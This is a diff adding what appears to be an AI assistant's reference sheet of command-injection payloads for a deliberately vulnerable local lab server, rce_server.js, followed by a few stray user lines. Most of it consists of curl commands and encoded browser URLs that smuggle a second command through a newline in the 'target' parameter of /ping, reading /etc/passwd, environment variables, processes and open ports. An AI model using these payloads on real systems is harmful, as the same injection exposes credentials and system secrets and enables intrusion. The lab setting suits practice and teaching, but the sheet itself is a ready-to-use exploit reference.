@@ -1,0 +1,117 @@
+To interact with and manage your local machine through your vulnerable laboratory server (rce_server.js on port 8085), you can use specific Linux commands that read system information, monitor processes, and check network settings.
+Below is the complete reference mapping the exact payloads for both curl commands (for the terminal) and their URL equivalents (to paste directly into your web browser address bar).
+------------------------------
+## 1. File and Directory Management
+These commands allow you to navigate the directory structure, list files, and view their sizes or content within your local environment.
+
+* List current folder contents (ls -lh):
+* Terminal (curl):
+   
+   curl -G "http://localhost:8085/ping" --data-urlencode "target=127.0.0.1
+   ls -lh"
+   
+   * Browser URL:
+   
+   http://localhost:8085/ping?target=127.0.0.1%0als%20-lh
+   
+   * Print current working directory path (pwd):
+* Terminal (curl):
+   
+   curl -G "http://localhost:8085/ping" --data-urlencode "target=127.0.0.1
+   pwd"
+   
+   * Browser URL:
+   
+   http://localhost:8085/ping?target=127.0.0.1%0apwd
+   
+   * Read local configuration layouts (e.g., viewing /etc/passwd):
+* Terminal (curl):
+   
+   curl -G "http://localhost:8085/ping" --data-urlencode "target=127.0.0.1
+   cat /etc/passwd"
+   
+   * Browser URL:
+   
+   http://localhost:8085/ping?target=127.0.0.1%0acat%20%2Fetc%2Fpasswd
+   
+   
+------------------------------
+## 2. System and Network Information
+These commands inspect your machine's system status, hardware profile, network configurations, and open ports. [1] 
+
+* Check network interface configurations (ip a):
+* Terminal (curl):
+   
+   curl -G "http://localhost:8085/ping" --data-urlencode "target=127.0.0.1
+   ip a"
+   
+   * Browser URL:
+   
+   http://localhost:8085/ping?target=127.0.0.1%0aip%20a
+   
+   * List active network connections and listening ports (ss -antp or netstat -antp):
+* Terminal (curl):
+   
+   curl -G "http://localhost:8085/ping" --data-urlencode "target=127.0.0.1
+   ss -antp"
+   
+   * Browser URL:
+   
+   http://localhost:8085/ping?target=127.0.0.1%0ass%20-antp
+   
+   [2] 
+* Display system uptime and resource averages (uptime):
+* Terminal (curl):
+   
+   curl -G "http://localhost:8085/ping" --data-urlencode "target=127.0.0.1
+   uptime"
+   
+   * Browser URL:
+   
+   http://localhost:8085/ping?target=127.0.0.1%0auptime
+   
+   
+------------------------------
+## 3. Process and Environment Inspection
+These commands let you look at running tasks, resource usage, and internal environment configurations. [3] 
+
+* List running system processes (ps aux):
+* Terminal (curl):
+   
+   curl -G "http://localhost:8085/ping" --data-urlencode "target=127.0.0.1
+   ps aux"
+   
+   * Browser URL:
+   
+   http://localhost:8085/ping?target=127.0.0.1%0aps%20aux
+   
+   * Print environment variable paths (env):
+* Terminal (curl):
+   
+   curl -G "http://localhost:8085/ping" --data-urlencode "target=127.0.0.1
+   env"
+   
+   * Browser URL:
+   
+   http://localhost:8085/ping?target=127.0.0.1%0aenv
+   
+   
+------------------------------
+## 💡 Quick-Reference URL Encoding Guide
+When modifying these strings or running alternative commands inside your browser address bar, map your space and structure characters using standard URL hex encoding:
+
+* Newline (\n) → %0a
+* Space ( ) → %20
+* Forward Slash (/) → %2F [4] 
+
+Would you like to review the complete, securely patched version of your rce_server.js file to see how to use strict argument validation to safely stop command injections entirely?
+
+[1] [https://www.techtarget.com](https://www.techtarget.com/searchnetworking/tip/5-basic-network-commands-for-Linux-and-Windows)
+[2] [https://iproyal.com](https://iproyal.com/blog/curl-get-request/)
+[3] [https://docs.digitalocean.com](https://docs.digitalocean.com/products/app-platform/how-to/console/)
+[4] [https://scrapfly.io](https://scrapfly.io/blog/posts/how-to-use-curl-get-requests)
+abang
+curl -G "http://localhost:8085/ping" --data-urlencode "target=127.0.0.1
+whoami"
+ curl -G "http://localhost:8085/ping" --data-urlencode "target=127.0.0.1
+ls"
